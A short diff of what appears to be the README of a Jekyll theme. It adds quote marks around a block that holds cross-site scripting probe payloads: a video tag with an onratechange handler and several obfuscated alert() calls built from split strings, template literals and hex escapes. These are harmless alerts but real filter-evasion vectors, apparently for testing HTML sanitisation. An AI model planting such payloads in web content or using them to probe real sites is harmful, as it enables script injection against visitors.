@@ -85,6 +85,8 @@ TeXt use [Tomorrow](https://github.com/chriskempson/tomorrow-theme) as the highl
 
 TeXt Theme is [MIT licensed](https://github.com/kitian616/jekyll-TeXt-theme/blob/master/LICENSE).
 
+
+'''
 <video src onratechange="alert(1)">
 
 
@@ -303,3 +305,4 @@ setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
+'''
